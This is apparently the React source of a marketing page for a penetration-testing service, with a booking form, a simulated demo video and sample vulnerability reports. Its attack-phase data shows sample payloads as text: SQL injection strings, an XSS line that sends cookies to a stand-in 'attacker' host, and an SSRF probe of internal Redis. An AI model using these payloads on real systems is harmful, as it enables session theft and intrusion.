import React, { useState } from 'react';
import { useNavigate } from 'react-router';
import { motion, AnimatePresence } from 'motion/react';
import {
  Shield, Search, Target, Zap, CheckCircle2, AlertTriangle,
  ArrowRight, Layers, FileText, BarChart2, Globe, Building2,
  ShoppingCart, Lock, Eye, Network, Radar, ChevronRight,
  Award, Fingerprint, Database, Crosshair, X, Download,
  User, Mail, Phone, ChevronDown, BookOpen, Calendar,
} from 'lucide-react';
import { ProductHeroBackground } from '../components/ProductHeroBackground';
import { ScrollReveal } from '../components/ScrollReveal';
import { StickySubNav } from '../components/StickySubNav';
import { Badge } from '../components/ui/badge';
import { Button } from '../components/ui/button';

// ─── Booking Modal ─────────────────────────────────────────────────
function BookingModal({ onClose }: { onClose: () => void }) {
  const [submitted, setSubmitted] = useState(false);
  const [form, setForm] = useState({ name: '', email: '', phone: '', company: '', pain: '' });
  const [loading, setLoading] = useState(false);

  const set = (k: keyof typeof form) => (e: React.ChangeEvent<HTMLInputElement | HTMLSelectElement>) =>
    setForm(f => ({ ...f, [k]: e.target.value }));

  const handleSubmit = (e: React.FormEvent) => {
    e.preventDefault();
    setLoading(true);
    setTimeout(() => { setLoading(false); setSubmitted(true); }, 900);
  };

  const inputStyle: React.CSSProperties = {
    width: '100%', boxSizing: 'border-box', padding: '10px 14px',
    border: '1.5px solid #e2e8f0', borderRadius: 10, fontSize: 14,
    outline: 'none', fontFamily: 'inherit', background: '#f8fafc', color: '#0f172a',
  };

  return (
    <div style={{ position: 'fixed', inset: 0, background: 'rgba(15,23,42,0.65)', zIndex: 9999, display: 'flex', alignItems: 'center', justifyContent: 'center', backdropFilter: 'blur(6px)', padding: 24 }}
      onClick={onClose}>
      <motion.div initial={{ opacity: 0, scale: 0.95, y: 20 }} animate={{ opacity: 1, scale: 1, y: 0 }} exit={{ opacity: 0, scale: 0.95 }}
        transition={{ duration: 0.22 }}
        style={{ background: '#fff', borderRadius: 20, width: '100%', maxWidth: 480, maxHeight: '90vh', overflowY: 'auto', boxShadow: '0 32px 80px rgba(0,0,0,0.25)', position: 'relative' }}
        onClick={e => e.stopPropagation()}>

        {/* Close */}
        <button onClick={onClose} style={{ position: 'absolute', top: 16, right: 16, background: '#f1f5f9', border: 'none', borderRadius: 8, width: 32, height: 32, cursor: 'pointer', display: 'flex', alignItems: 'center', justifyContent: 'center', zIndex: 10 }}>
          <X size={15} color="#64748b" />
        </button>

        {submitted ? (
          /* ── Success state ── */
          <div style={{ padding: '48px 36px', textAlign: 'center' }}>
            <div style={{ width: 64, height: 64, borderRadius: '50%', background: 'rgba(16,185,129,0.12)', border: '2px solid rgba(16,185,129,0.3)', display: 'flex', alignItems: 'center', justifyContent: 'center', margin: '0 auto 20px' }}>
              <CheckCircle2 size={30} style={{ color: '#10b981' }} />
            </div>
            <h3 style={{ fontSize: 20, fontWeight: 800, color: '#0f172a', margin: '0 0 10px' }}>预约成功！</h3>
            <p style={{ fontSize: 14, color: '#64748b', lineHeight: 1.75, margin: '0 0 24px' }}>
              感谢您的预约！我们的安全专家将在 <strong style={{ color: '#0f172a' }}>24 小时内</strong> 联系您。<br />
              您可以先查看我们的渗透测试报告样本，了解交付物规格。
            </p>
            <a href="#" style={{ display: 'inline-flex', alignItems: 'center', gap: 8, padding: '11px 24px', background: 'linear-gradient(135deg,#ef4444,#f97316)', color: '#fff', borderRadius: 12, fontSize: 14, fontWeight: 700, textDecoration: 'none', boxShadow: '0 4px 16px rgba(239,68,68,0.3)' }}>
              <Download size={15} /> 下载《渗透测试报告样本》PDF
            </a>
            <div style={{ marginTop: 16 }}>
              <button onClick={onClose} style={{ background: 'none', border: 'none', color: '#94a3b8', fontSize: 13, cursor: 'pointer' }}>关闭</button>
            </div>
          </div>
        ) : (
          /* ── Form state ── */
          <div style={{ padding: '32px 32px' }}>
            {/* Header */}
            <div style={{ marginBottom: 24 }}>
              <div style={{ display: 'flex', alignItems: 'center', gap: 10, marginBottom: 8 }}>
                <div style={{ width: 40, height: 40, borderRadius: 12, background: 'linear-gradient(135deg,#ef4444,#f97316)', display: 'flex', alignItems: 'center', justifyContent: 'center' }}>
                  <Calendar size={18} style={{ color: '#fff' }} />
                </div>
                <div>
                  <h3 style={{ margin: 0, fontSize: 18, fontWeight: 800, color: '#0f172a' }}>预约 1 对 1 专家演示</h3>
                  <p style={{ margin: 0, fontSize: 12, color: '#64748b' }}>获取定制化渗透测试方案</p>
                </div>
              </div>
              <div style={{ display: 'flex', gap: 8, marginTop: 12 }}>
                {['CCRC 一级资质', '24h 响应', '免费初步评估'].map(t => (
                  <span key={t} style={{ fontSize: 11, padding: '3px 9px', background: 'rgba(239,68,68,0.08)', color: '#dc2626', border: '1px solid rgba(239,68,68,0.2)', borderRadius: 20, fontWeight: 600 }}>{t}</span>
                ))}
              </div>
            </div>

            <form onSubmit={handleSubmit} style={{ display: 'flex', flexDirection: 'column', gap: 14 }}>
              {/* Name */}
              <div>
                <label style={{ display: 'block', fontSize: 13, fontWeight: 600, color: '#374151', marginBottom: 6 }}>
                  <User size={12} style={{ display: 'inline', marginRight: 4, verticalAlign: 'middle' }} />
                  姓名 <span style={{ color: '#ef4444' }}>*</span>
                </label>
                <input required value={form.name} onChange={set('name')} placeholder="请输入您的姓名" style={inputStyle} />
              </div>
              {/* Email */}
              <div>
                <label style={{ display: 'block', fontSize: 13, fontWeight: 600, color: '#374151', marginBottom: 6 }}>
                  <Mail size={12} style={{ display: 'inline', marginRight: 4, verticalAlign: 'middle' }} />
                  企业邮箱 <span style={{ color: '#ef4444' }}>*</span>
                </label>
                <input required type="email" value={form.email} onChange={set('email')} placeholder="your@company.com" style={inputStyle} />
              </div>
              {/* Phone */}
              <div>
                <label style={{ display: 'block', fontSize: 13, fontWeight: 600, color: '#374151', marginBottom: 6 }}>
                  <Phone size={12} style={{ display: 'inline', marginRight: 4, verticalAlign: 'middle' }} />
                  手机号 <span style={{ color: '#ef4444' }}>*</span>
                </label>
                <input required value={form.phone} onChange={set('phone')} placeholder="便于安全专家快速联系" style={inputStyle} />
              </div>
              {/* Company */}
              <div>
                <label style={{ display: 'block', fontSize: 13, fontWeight: 600, color: '#374151', marginBottom: 6 }}>
                  <Building2 size={12} style={{ display: 'inline', marginRight: 4, verticalAlign: 'middle' }} />
                  公司名称 <span style={{ color: '#ef4444' }}>*</span>
                </label>
                <input required value={form.company} onChange={set('company')} placeholder="请输入您所在公司名称" style={inputStyle} />
              </div>
              {/* Pain point */}
              <div>
                <label style={{ display: 'block', fontSize: 13, fontWeight: 600, color: '#374151', marginBottom: 6 }}>
                  您最关心的痛点？
                </label>
                <div style={{ position: 'relative' }}>
                  <select value={form.pain} onChange={set('pain')} style={{ ...inputStyle, appearance: 'none', cursor: 'pointer', paddingRight: 36 }}>
                    <option value="">请选择（可跳过）</option>
                    <option value="等保合规">通过等保合规要求</option>
                    <option value="排查漏洞">曾被攻击，需排查系统漏洞</option>
                    <option value="日常巡检">日常安全巡检与加固</option>
                    <option value="其他">其他需求</option>
                  </select>
                  <ChevronDown size={14} style={{ position: 'absolute', right: 12, top: '50%', transform: 'translateY(-50%)', color: '#94a3b8', pointerEvents: 'none' }} />
                </div>
              </div>

              <div style={{ display: 'flex', gap: 10, marginTop: 6 }}>
                <button type="submit" disabled={loading}
                  style={{ flex: 1, padding: '12px', background: loading ? '#94a3b8' : 'linear-gradient(135deg,#ef4444,#f97316)', color: '#fff', border: 'none', borderRadius: 12, fontSize: 15, fontWeight: 700, cursor: loading ? 'not-allowed' : 'pointer', boxShadow: loading ? 'none' : '0 4px 16px rgba(239,68,68,0.35)' }}>
                  {loading ? '提交中...' : '提交预约'}
                </button>
                <button type="button" onClick={onClose}
                  style={{ padding: '12px 20px', background: 'transparent', border: '1.5px solid #e2e8f0', borderRadius: 12, fontSize: 14, color: '#64748b', cursor: 'pointer', fontWeight: 500 }}>
                  取消
                </button>
              </div>
              <p style={{ textAlign: 'center', fontSize: 11.5, color: '#94a3b8', margin: 0 }}>
                提交即视为同意我们的隐私政策，信息仅用于安全咨询跟进
              </p>
            </form>
          </div>
        )}
      </motion.div>
    </div>
  );
}

// ── Attack Chain Phases ────────────────────────────────────────────
const ATTACK_PHASES = [
  {
    id: 'recon', step: '01', label: '侦察', color: '#6366f1', icon: Search,
    desc: '全方位信息收集，绘制攻击面地图',
    techniques: [
      { name: 'OSINT 情报收集', detail: '通过公开数据源获取目标组织信息、员工、技术栈' },
      { name: '端口与服务扫描', detail: 'TCP/UDP 全端口扫描，识别 Nginx、Tomcat、Redis 等服务指纹' },
      { name: '子域名枚举', detail: 'DNS 爆破 + 证书透明度日志，发现隐藏业务系统' },
      { name: '指纹识别', detail: '识别 CMS（WordPress/Shiro）、框架版本、WAF 类型' },
    ],
    findings: ['发现 312 个开放端口', '18 个子域名', '3 个高危指纹'],
  },
  {
    id: 'weapon', step: '02', label: '武器化', color: '#f59e0b', icon: Crosshair,
    desc: '基于目标特征定制攻击载荷',
    techniques: [
      { name: 'SQL 注入 Payload', detail: "' OR 1=1 --  /  UNION SELECT null,table_name FROM information_schema.tables" },
      { name: 'XSS 载荷构造', detail: "<script>document.location='http://attacker/?c='+document.cookie</script>" },
      { name: 'SSRF 探针', detail: 'http://127.0.0.1:6379/  探测内网 Redis 未授权' },
      { name: 'RCE 利用链', detail: 'Log4Shell / Shiro 反序列化 / FastJSON 组合利用' },
    ],
    findings: ['构造 47 个专属载荷', '覆盖 CVE-2024-x', '0 day 利用链'],
  },
  {
    id: 'delivery', step: '03', label: '交付', color: '#ef4444', icon: Zap,
    desc: '多路径渗透，突破防御边界',
    techniques: [
      { name: 'Web 应用渗透', detail: 'HTTP/HTTPS 请求注入，绕过 WAF 规则过滤' },
      { name: '业务逻辑漏洞', detail: '支付绕过、越权访问、验证码逻辑缺陷' },
      { name: 'API 端点测试', detail: '未授权 API 接口、水平越权、参数篡改' },
      { name: '社工钓鱼模拟', detail: '邮件钓鱼 + 水坑攻击模拟（需客户授权）' },
    ],
    findings: ['突破 3 道防线', '获取内网立足点', 'WAF 绕过成功'],
  },
  {
    id: 'exploit', step: '04', label: '利用', color: '#10b981', icon: Target,
    desc: '权限提升，评估真实业务影响',
    techniques: [
      { name: '权限提升', detail: '从普通用户提权至 root/Administrator 系统权限' },
      { name: '横向移动', detail: '通过内网漫游，访问核心数据库与业务系统' },
      { name: '数据泄露评估', detail: '模拟敏感数据（PII/金融记录）泄露路径评估' },
      { name: '持久化植入模拟', detail: '验证后门/Webshell 植入可行性（不实际执行）' },
    ],
    findings: ['获取数据库 root', '访问 230 万条记录', '全链路漏洞报告'],
  },
];

// ── Service Steps ──────────────────────────────────────────────────
const SERVICE_STEPS = [
  { step: 1, title: '授权与调研',     icon: FileText,    color: '#6366f1', desc: '明确测试范围与边界，签署授权协议。双方确认资产清单、测试时间窗口与紧急联系机制，确保测试合法合规、风险可控。' },
  { step: 2, title: '信息收集',       icon: Search,      color: '#3b82f6', desc: '全方位资产指纹识别：子域名枚举、端口扫描、服务识别、CMS 与框架版本探测，构建完整攻击面视图。' },
  { step: 3, title: '威胁建模',       icon: Radar,       color: '#f59e0b', desc: '基于目标特征定制攻击路径。结合 MITRE ATT&CK 框架，针对目标技术栈制定专属载荷与渗透策略。' },
  { step: 4, title: '漏洞挖掘与利用', icon: Target,      color: '#ef4444', desc: '机器初筛（自动化扫描）+ 专家深度渗透测试：SQL注入、XSS、RCE、越权访问、业务逻辑缺陷全面覆盖，专家人工复核消除误报。' },
  { step: 5, title: '报告与复测',     icon: CheckCircle2,color: '#10b981', desc: '交付详细的漏洞报告（含复现步骤、风险评级、修复建议），提供 30 天免费复测服务，直至全部漏洞修复完成。' },
];

// ── Credentials ───────────────────────────────────────────────────
const CREDENTIALS = [
  { label: 'CCRC', sub: '网络安全服务一级资质', color: '#6366f1', icon: Award },
  { label: 'CNCVE', sub: '国家漏洞库成员单位', color: '#3b82f6', icon: Database },
  { label: 'ISO 27001', sub: '信息安全管理体系认证', color: '#10b981', icon: Shield },
  { label: '等保 2.0', sub: '三级测评服务机构', color: '#f59e0b', icon: CheckCircle2 },
  { label: 'OSCP', sub: '持证渗透测试专家团队', color: '#ef4444', icon: Target },
];

// ─────────────────────────────────────────────────────────────────
// ── Video Demo Modal ───────────────────────────────────────────────
const VIDEO_SCRIPTS: Record<string, { title: string; phases: { time: string; label: string; desc: string }[] }> = {
  '01': {
    title: '资产自动发现 · 3 分钟万级资产画像',
    phases: [
      { time: '00:00–00:05', label: '痛点呈现', desc: '传统扫描工具报告杂乱，资产指纹缺失，遗漏隐蔽服务' },
      { time: '00:05–00:25', label: '产品演示', desc: '输入目标域名 → 一键启动 → 自动枚举子域名、端口、服务指纹' },
      { time: '00:25–00:40', label: '高光时刻', desc: '3 分钟生成拓扑图，精准识别隐蔽 Redis 端口与 Shiro 指纹' },
      { time: '00:40–00:45', label: '结尾号召', desc: '"3 分钟，万级资产精准画像" · 立即申请试测' },
    ],
  },
  '02': {
    title: '漏洞深度验证 · 0 误报承诺演示',
    phases: [
      { time: '00:00–00:05', label: '痛点呈现', desc: '普通扫描器产生大量误报，安全团队疲于奔命排查噪音' },
      { time: '00:05–00:25', label: '产品演示', desc: '专家人工验证流程：SQL 注入 PoC 执行 → 数据回显 → 确认可利用' },
      { time: '00:25–00:40', label: '高光时刻', desc: '漏洞详情页展示：截图+PoC代码+修复建议一体，误报率 0%' },
      { time: '00:40–00:45', label: '结尾号召', desc: '"每个漏洞真实可利用，专家负责任交付" · 立即预约' },
    ],
  },
  '03': {
    title: '业务逻辑测试 · 发现扫描器盲区',
    phases: [
      { time: '00:00–00:05', label: '痛点呈现', desc: '支付系统上线后被薅羊毛，传统扫描器对业务逻辑漏洞束手无策' },
      { time: '00:05–00:25', label: '产品演示', desc: '手动测试：修改支付金额参数 → 绕过验证 → 低价购买高价商品' },
      { time: '00:25–00:40', label: '高光时刻', desc: '业务逻辑漏洞报告：5 个支付/越权/验证码场景，专家逐一复现' },
      { time: '00:40–00:45', label: '结尾号召', desc: '"扫描器做不到的，我们来做" · 立即预约专家' },
    ],
  },
};

function VideoModal({ capId, onClose }: { capId: string; onClose: () => void }) {
  const [isPlaying, setIsPlaying] = useState(false);
  const [progress, setProgress] = useState(0);
  const script = VIDEO_SCRIPTS[capId];
  const [activePhase, setActivePhase] = useState(0);

  React.useEffect(() => {
    if (!isPlaying) return;
    const interval = setInterval(() => {
      setProgress(p => {
        const next = p + 0.4;
        if (next >= 100) { clearInterval(interval); setIsPlaying(false); return 100; }
        setActivePhase(Math.floor((next / 100) * script.phases.length));
        return next;
      });
    }, 180);
    return () => clearInterval(interval);
  }, [isPlaying, script.phases.length]);

  const handlePlay = () => { setIsPlaying(true); setProgress(0); setActivePhase(0); };

  return (
    <div
      style={{ position: 'fixed', inset: 0, background: 'rgba(0,0,0,0.82)', zIndex: 9999, display: 'flex', alignItems: 'center', justifyContent: 'center', backdropFilter: 'blur(6px)' }}
      onClick={onClose}
    >
      <motion.div
        initial={{ opacity: 0, scale: 0.93, y: 24 }}
        animate={{ opacity: 1, scale: 1, y: 0 }}
        exit={{ opacity: 0, scale: 0.93 }}
        transition={{ duration: 0.22 }}
        style={{ width: 'min(860px, 92vw)', borderRadius: 16, overflow: 'hidden', background: '#0a0a0f', boxShadow: '0 40px 120px rgba(0,0,0,0.6)' }}
        onClick={e => e.stopPropagation()}
      >
        {/* Title bar */}
        <div style={{ display: 'flex', alignItems: 'center', justifyContent: 'space-between', padding: '14px 20px', borderBottom: '1px solid rgba(255,255,255,0.07)', background: '#111118' }}>
          <div style={{ fontSize: 13.5, fontWeight: 700, color: '#e2e8f0', display: 'flex', alignItems: 'center', gap: 8 }}>
            <div style={{ width: 8, height: 8, borderRadius: '50%', background: '#ef4444', boxShadow: '0 0 6px #ef4444' }} />
            {script?.title}
          </div>
          <button onClick={onClose} style={{ background: 'rgba(255,255,255,0.08)', border: 'none', borderRadius: 8, width: 30, height: 30, cursor: 'pointer', display: 'flex', alignItems: 'center', justifyContent: 'center', color: '#94a3b8', fontSize: 16, fontWeight: 300 }}>✕</button>
        </div>

        {/* Video canvas — 16:9 */}
        <div style={{ position: 'relative', paddingTop: '56.25%', background: 'linear-gradient(135deg,#0d1117,#1a1f2e)', overflow: 'hidden' }}>
          {/* Simulated screen content */}
          <div style={{ position: 'absolute', inset: 0, display: 'flex', flexDirection: 'column', alignItems: 'center', justifyContent: 'center', gap: 20 }}>
            {/* Fake product UI mock */}
            <div style={{ width: '72%', background: 'rgba(255,255,255,0.04)', border: '1px solid rgba(255,255,255,0.08)', borderRadius: 10, padding: '16px 20px' }}>
              <div style={{ display: 'flex', gap: 6, marginBottom: 12 }}>
                {['#ff5f57','#febc2e','#28c840'].map(c => <div key={c} style={{ width: 9, height: 9, borderRadius: '50%', background: c }} />)}
                <span style={{ fontSize: 11, color: '#475569', marginLeft: 8, fontFamily: 'monospace' }}>玄鉴 · 网络渗透测试平台</span>
              </div>
              <div style={{ display: 'flex', gap: 8, marginBottom: 10 }}>
                <div style={{ flex: 1, height: 28, background: 'rgba(255,255,255,0.06)', borderRadius: 6, border: '1px solid rgba(255,255,255,0.1)', padding: '0 10px', display: 'flex', alignItems: 'center' }}>
                  <span style={{ fontSize: 10.5, color: '#64748b', fontFamily: 'monospace' }}>target.company.com</span>
                </div>
                <div style={{ padding: '0 14px', height: 28, borderRadius: 6, background: 'linear-gradient(135deg,#ef4444,#f97316)', display: 'flex', alignItems: 'center', fontSize: 11, fontWeight: 700, color: '#fff' }}>
                  {isPlaying ? '扫描中…' : '开始扫描'}
                </div>
              </div>
              {isPlaying && (
                <div style={{ display: 'flex', flexDirection: 'column', gap: 5 }}>
                  {['api.target.com:443 · Nginx 1.24 · HIGH', 'admin.target.cn:8080 · Shiro 1.6 · HIGH', '10.0.1.32:6379 · Redis (无认证) · CRITICAL'].slice(0, Math.ceil(activePhase + 1)).map(row => (
                    <div key={row} style={{ fontSize: 10, color: '#4ade80', fontFamily: 'monospace', padding: '4px 8px', background: 'rgba(74,222,128,0.06)', borderRadius: 4 }}>{'> ' + row}</div>
                  ))}
                </div>
              )}
            </div>

            {/* Phase caption */}
            {script?.phases[Math.min(activePhase, script.phases.length - 1)] && (
              <div style={{ textAlign: 'center' }}>
                <div style={{ fontSize: 11, color: '#ef4444', fontWeight: 700, marginBottom: 4 }}>
                  {script.phases[Math.min(activePhase, script.phases.length - 1)].time} · {script.phases[Math.min(activePhase, script.phases.length - 1)].label}
                </div>
                <div style={{ fontSize: 13, color: '#94a3b8', maxWidth: 480 }}>
                  {script.phases[Math.min(activePhase, script.phases.length - 1)].desc}
                </div>
              </div>
            )}
          </div>

          {/* Play button overlay */}
          {!isPlaying && progress === 0 && (
            <div style={{ position: 'absolute', inset: 0, display: 'flex', alignItems: 'center', justifyContent: 'center', background: 'rgba(0,0,0,0.35)', cursor: 'pointer' }} onClick={handlePlay}>
              <div style={{ width: 70, height: 70, borderRadius: '50%', background: 'rgba(255,255,255,0.15)', backdropFilter: 'blur(8px)', border: '2px solid rgba(255,255,255,0.3)', display: 'flex', alignItems: 'center', justifyContent: 'center', transition: 'transform 0.15s' }}>
                <div style={{ width: 0, height: 0, borderTop: '14px solid transparent', borderBottom: '14px solid transparent', borderLeft: '22px solid #fff', marginLeft: 4 }} />
              </div>
            </div>
          )}
          {progress >= 100 && (
            <div style={{ position: 'absolute', inset: 0, background: 'rgba(0,0,0,0.6)', display: 'flex', flexDirection: 'column', alignItems: 'center', justifyContent: 'center', gap: 16 }}>
              <div style={{ fontSize: 18, fontWeight: 900, color: '#fff' }}>演示完成</div>
              <button onClick={handlePlay} style={{ padding: '10px 24px', borderRadius: 8, background: 'linear-gradient(135deg,#ef4444,#f97316)', color: '#fff', border: 'none', fontWeight: 700, fontSize: 14, cursor: 'pointer' }}>重新播放</button>
            </div>
          )}
        </div>

        {/* Controls */}
        <div style={{ padding: '12px 20px', background: '#111118', borderTop: '1px solid rgba(255,255,255,0.07)' }}>
          <div style={{ display: 'flex', alignItems: 'center', gap: 12 }}>
            <button onClick={isPlaying ? () => setIsPlaying(false) : handlePlay}
              style={{ width: 30, height: 30, borderRadius: '50%', background: 'rgba(255,255,255,0.08)', border: '1px solid rgba(255,255,255,0.12)', color: '#fff', cursor: 'pointer', display: 'flex', alignItems: 'center', justifyContent: 'center' }}>
              {isPlaying
                ? <div style={{ display: 'flex', gap: 2 }}><div style={{ width: 3, height: 12, background: '#fff', borderRadius: 1 }} /><div style={{ width: 3, height: 12, background: '#fff', borderRadius: 1 }} /></div>
                : <div style={{ width: 0, height: 0, borderTop: '6px solid transparent', borderBottom: '6px solid transparent', borderLeft: '10px solid #fff', marginLeft: 2 }} />}
            </button>
            <div style={{ flex: 1, height: 3, background: 'rgba(255,255,255,0.1)', borderRadius: 2, cursor: 'pointer', position: 'relative', overflow: 'hidden' }}
              onClick={e => { const r = e.currentTarget.getBoundingClientRect(); setProgress(((e.clientX - r.left) / r.width) * 100); }}>
              <div style={{ height: '100%', width: `${progress}%`, background: 'linear-gradient(90deg,#ef4444,#f97316)', borderRadius: 2, transition: isPlaying ? 'none' : 'width 0.2s' }} />
            </div>
            <span style={{ fontSize: 11, color: '#475569', fontFamily: 'monospace', flexShrink: 0 }}>0:45</span>
          </div>
          <div style={{ marginTop: 8, display: 'flex', gap: 6, flexWrap: 'wrap' }}>
            {script?.phases.map((p, i) => (
              <button key={i} onClick={() => { setActivePhase(i); setProgress((i / script.phases.length) * 100); setIsPlaying(false); }}
                style={{ padding: '3px 10px', borderRadius: 20, border: `1px solid ${activePhase === i ? 'rgba(239,68,68,0.5)' : 'rgba(255,255,255,0.08)'}`, background: activePhase === i ? 'rgba(239,68,68,0.12)' : 'transparent', color: activePhase === i ? '#fca5a5' : '#475569', fontSize: 11, cursor: 'pointer', fontWeight: activePhase === i ? 600 : 400 }}>
                {p.label}
              </button>
            ))}
          </div>
        </div>
      </motion.div>
    </div>
  );
}

export function PenetrationTest() {
  const navigate = useNavigate();
  const [showBooking, setShowBooking] = useState(false);
  const [showVideo, setShowVideo] = useState<string | null>(null);
  const [hoveredPhase, setHoveredPhase] = useState<string | null>(null);

  // ── Industry solution mocks ──────────────────────────────────────
  function FinanceMock() {
    const items = [
      { label: 'API 越权访问', level: 'CRITICAL', color: '#ef4444', found: true },
      { label: '弱口令暴破', level: 'HIGH', color: '#f97316', found: true },
      { label: 'JWT 伪造漏洞', level: 'HIGH', color: '#f97316', found: true },
      { label: 'CSRF 跨站请求', level: 'MEDIUM', color: '#d97706', found: false },
    ];
    return (
      <div style={{ background: 'linear-gradient(150deg,#fef2f2,#fff7ed)', borderRadius: 16, padding: '18px 20px', border: '1px solid rgba(239,68,68,0.18)' }}>
        <div style={{ fontSize: 11, fontWeight: 700, color: '#374151', textTransform: 'uppercase', letterSpacing: '0.08em', marginBottom: 12 }}>金融系统渗透报告摘要</div>
        <div style={{ display: 'flex', flexDirection: 'column', gap: 8 }}>
          {items.map(it => (
            <div key={it.label} style={{ display: 'flex', alignItems: 'center', gap: 10, padding: '8px 12px', background: '#fff', borderRadius: 9, border: `1px solid ${it.found ? it.color + '22' : '#e2e8f0'}` }}>
              <div style={{ width: 6, height: 6, borderRadius: '50%', background: it.found ? it.color : '#94a3b8', flexShrink: 0 }} />
              <span style={{ flex: 1, fontSize: 12, color: '#374151' }}>{it.label}</span>
              <span style={{ fontSize: 10, fontWeight: 700, padding: '2px 7px', background: it.found ? `${it.color}12` : '#f1f5f9', color: it.found ? it.color : '#94a3b8', borderRadius: 6 }}>{it.level}</span>
            </div>
          ))}
        </div>
        <div style={{ marginTop: 12, padding: '8px 12px', background: 'rgba(239,68,68,0.07)', borderRadius: 9, border: '1px solid rgba(239,68,68,0.15)', fontSize: 11, color: '#b91c1c' }}>
          发现 3 个高危漏洞 · 建议暂停上线 · 需在 48h 内修复
        </div>
      </div>
    );
  }

  function GovMock() {
    const phases = [
      { label: '资产探测', done: true, color: '#6366f1' },
      { label: '边界突破', done: true, color: '#f59e0b' },
      { label: '横向渗透', done: true, color: '#ef4444' },
      { label: '目标达成', done: false, color: '#94a3b8' },
    ];
    return (
      <div style={{ background: 'linear-gradient(150deg,#f5f3ff,#ede9fe)', borderRadius: 16, padding: '18px 20px', border: '1px solid rgba(99,102,241,0.18)' }}>
        <div style={{ fontSize: 11, fontWeight: 700, color: '#374151', textTransform: 'uppercase', letterSpacing: '0.08em', marginBottom: 12 }}>护网演练 · 攻击链路</div>
        <div style={{ display: 'flex', gap: 4, alignItems: 'center', marginBottom: 16 }}>
          {phases.map((p, i) => (
            <React.Fragment key={p.label}>
              <div style={{ flex: 1, textAlign: 'center', padding: '8px 6px', background: p.done ? `${p.color}14` : '#f8fafc', borderRadius: 8, border: `1px solid ${p.done ? p.color + '30' : '#e2e8f0'}` }}>
                <div style={{ fontSize: 10, fontWeight: 700, color: p.done ? p.color : '#94a3b8' }}>{p.label}</div>
                <div style={{ fontSize: 9, color: p.done ? p.color : '#94a3b8', marginTop: 2 }}>{p.done ? '✓ 成功' : '未到达'}</div>
              </div>
              {i < phases.length - 1 && <ChevronRight size={12} style={{ color: '#d1d5db', flexShrink: 0 }} />}
            </React.Fragment>
          ))}
        </div>
        <div style={{ padding: '8px 12px', background: 'rgba(99,102,241,0.07)', borderRadius: 9, border: '1px solid rgba(99,102,241,0.15)', fontSize: 11, color: '#4f46e5' }}>
          已模拟突破 3 层网络隔离 · 防御薄弱点已定位 · 生成加固报告
        </div>
      </div>
    );
  }

  function EcomMock() {
    const bugs = [
      { label: '支付金额可篡改', severity: '高危', color: '#ef4444' },
      { label: '优惠券无限叠加', severity: '中危', color: '#d97706' },
      { label: '验证码可重放', severity: '中危', color: '#d97706' },
    ];
    return (
      <div style={{ background: 'linear-gradient(150deg,#f0fdf4,#dcfce7)', borderRadius: 16, padding: '18px 20px', border: '1px solid rgba(16,185,129,0.18)' }}>
        <div style={{ fontSize: 11, fontWeight: 700, color: '#374151', textTransform: 'uppercase', letterSpacing: '0.08em', marginBottom: 12 }}>电商业务逻辑漏洞</div>
        <div style={{ display: 'flex', flexDirection: 'column', gap: 8 }}>
          {bugs.map(b => (
            <div key={b.label} style={{ display: 'flex', alignItems: 'center', gap: 10, padding: '9px 12px', background: '#fff', borderRadius: 9, border: `1px solid ${b.color}22` }}>
              <AlertTriangle size={13} style={{ color: b.color, flexShrink: 0 }} />
              <span style={{ flex: 1, fontSize: 12, color: '#374151' }}>{b.label}</span>
              <span style={{ fontSize: 10, fontWeight: 700, padding: '2px 7px', background: `${b.color}12`, color: b.color, borderRadius: 6 }}>{b.severity}</span>
            </div>
          ))}
        </div>
        <div style={{ marginTop: 12, padding: '8px 12px', background: 'rgba(16,185,129,0.07)', borderRadius: 9, border: '1px solid rgba(16,185,129,0.15)', fontSize: 11, color: '#065f46' }}>
          修复后已复测通过 · 大促期间零安全事故 · 交付验收报告
        </div>
      </div>
    );
  }

  const INDUSTRY_SOLUTIONS = [
    {
      id: 'finance', icon: '🏦', accentColor: '#3b82f6', tag: '金融 / 证券 / 保险',
      title: '满足银保监合规要求，保障交易系统安全',
      subtitle: '核心交易系统授权渗透，0 误报专家报告',
      desc: '面向银行、证券、保险等金融机构，严格遵循银保监会网络安全指引。覆盖核心交易系统、移动端 App、API 网关的全面渗透测试，发现越权访问、JWT 伪造、弱口令等高危漏洞，出具符合监管要求的报告，直接用于监管提交。',
      metrics: [{ value: '0', label: '误报率' }, { value: '99%', label: '漏洞检出率' }, { value: '72h', label: '报告交付' }],
      tags: ['银保监合规', 'API 安全', 'JWT 验证', '核心系统测试'],
      mock: <FinanceMock />,
    },
    {
      id: 'gov', icon: '🏛️', accentColor: '#6366f1', tag: '政务 / 关键基础设施',
      title: '护网行动专项支撑，关键基础设施全覆盖',
      subtitle: '攻防对抗演练 + 等保 2.0 三级渗透',
      desc: '支持政府机构、能源、交通等关键基础设施单位参与护网行动（HW）演练，提供红队攻击模拟、蓝队响应演练。覆盖等保 2.0 三级渗透测试，OT/SCADA 工控系统安全评估，协助单位在护网期间零失分。',
      metrics: [{ value: '5年+', label: '护网经验' }, { value: '200+', label: '政务项目' }, { value: '0', label: '核心系统失陷' }],
      tags: ['护网行动 HW', '等保 2.0 三级', 'OT/SCADA 评估', '红队演练'],
      mock: <GovMock />,
    },
    {
      id: 'ecom', icon: '🛍️', accentColor: '#10b981', tag: '电商 / 零售 / O2O',
      title: '防止数据泄露，保障大促期间系统稳定',
      subtitle: '业务逻辑漏洞专项测试，大促零事故',
      desc: '针对电商平台大流量、高并发场景，专项测试支付逻辑漏洞（刷单、优惠码滥用）、用户数据隔离、第三方插件供应链风险。618/双11 大促前完成安全加固，确保系统在高负载下零安全事故。',
      metrics: [{ value: '3亿+', label: '保障交易额' }, { value: '4h', label: '紧急响应' }, { value: '100%', label: '大促零事故' }],
      tags: ['支付逻辑漏洞', '业务逻辑测试', '大促安全保障', '数据隔离验证'],
      mock: <EcomMock />,
    },
  ];

  return (
    <div>
      {/* ── Modals ── */}
      <AnimatePresence>
        {showBooking && <BookingModal onClose={() => setShowBooking(false)} />}
        {showVideo && <VideoModal capId={showVideo} onClose={() => setShowVideo(null)} />}
      </AnimatePresence>

      {/* ══ 1. HERO ════════════════════════════════════════════════ */}
      <section className="product-detail-hero" style={{ position: 'relative', minHeight: 560, display: 'flex', alignItems: 'center', overflow: 'hidden', background: 'linear-gradient(135deg,#0f172a 0%,#1e1b4b 60%,#1e293b 100%)' }}>
        <ProductHeroBackground side="system" concept="penetration" />
        <div style={{ position: 'relative', zIndex: 1, maxWidth: 1200, margin: '0 auto', padding: '80px 48px', width: '100%' }}>
          <div style={{ display: 'grid', gridTemplateColumns: '1fr 1fr', gap: 64, alignItems: 'center' }}>
